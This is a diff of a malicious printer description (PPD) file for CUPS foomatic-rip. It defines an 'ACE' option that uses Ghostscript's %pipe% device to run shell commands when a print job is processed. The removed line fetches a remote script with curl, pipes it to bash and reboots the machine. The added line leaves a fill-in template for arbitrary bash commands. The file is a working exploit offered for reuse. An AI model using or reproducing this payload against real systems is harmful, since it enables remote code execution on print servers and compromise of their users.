@@ -24,6 +24,6 @@
 *FoomaticRIPCommandLine: "gs -q -dSAFER -dDELAYSAFER -dNOPAUSE -dBATCH -sDEVICE=ppmraw -sOutputFile=- -"
 *OrderDependency: 10 PageSetup *ACE
 *FoomaticRIPOption ACE: enum PS Z
-*FoomaticRIPOptionSetting ACE=On: "(%pipe%curl -fsSL https://raw.githubusercontent.com/nonameuserosint-hue/Copyfail-sh/refs/heads/main/copyfail.sh | bash && sudo reboot) (w) file closefile"
+*FoomaticRIPOptionSetting ACE=On: "(%pipe%{write your bash commands here! remove the curly brackets first}) (w) file closefile"
 *DefaultACE: On
 *End
